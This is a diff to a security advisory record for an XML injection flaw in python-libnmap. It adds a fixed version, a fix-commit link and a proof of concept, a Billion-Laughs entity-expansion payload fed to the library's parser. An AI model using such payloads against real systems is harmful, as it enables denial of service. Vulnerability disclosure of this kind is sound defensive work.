@@ -1,12 +1,12 @@
 {
   "id": "GHSA-9ccv-p7fg-m73x",
-  "modified": "2023-04-11T01:48:00.910303Z",
+  "modified": "2023-09-01T20:01:35.370791Z",
   "published": "2019-07-18T15:38:41Z",
   "aliases": [
     "CVE-2019-1010017"
   ],
   "summary": "XML Injection in python-libnmap",
-  "details": "python-libnmap is affected by: XML Injection. The impact is: Denial of service (DoS) by consuming resources. The component is: XML Parsing. The attack vector is: Specially crafted XML payload.",
+  "details": "### Description\n\npython-libnmap is affected by a Billion-Laughs -style XML injection vulnerability.\n\n### PoC\n\n```python\nty = NmapParser()\n\npayload = \"\"\"\n\u003c!DOCTYPE lolz [\n \u003c!ENTITY lol \"lol\"\u003e\n \u003c!ELEMENT lolz (#PCDATA)\u003e\n \u003c!ENTITY lol1 \"\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\"\u003e\n \u003c!ENTITY lol2 \"\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\"\u003e\n \u003c!ENTITY lol3 \"\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\"\u003e\n]\u003e\n\u003clolz\u003e\u003chello\u003e\u0026lol3;\u003c/hello\u003e\u003c/lolz\u003e\n\"\"\"\n\nty.parse(payload)\n```",
   "affected": [
     {
       "package": {
@@ -21,7 +21,9 @@
             {
               "introduced": "0"
             },
-            {}
+            {
+              "fixed": "0.7.2"
+            }
           ]
         }
       ],
@@ -40,6 +42,11 @@
         "0.6.3",
         "0.7.0"
       ],
+      "ecosystem_specific": {
+        "affected_functions": [
+          ""
+        ]
+      },
       "database_specific": {
         "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2019/07/GHSA-9ccv-p7fg-m73x/GHSA-9ccv-p7fg-m73x.json"
       }
@@ -53,6 +60,10 @@
     {
       "type": "WEB",
       "url": "https://github.com/savon-noir/python-libnmap/issues/87"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/savon-noir/python-libnmap/commit/71b707758851e4b622f87d9a73266e06f60aeab4"
     }
   ]
 }
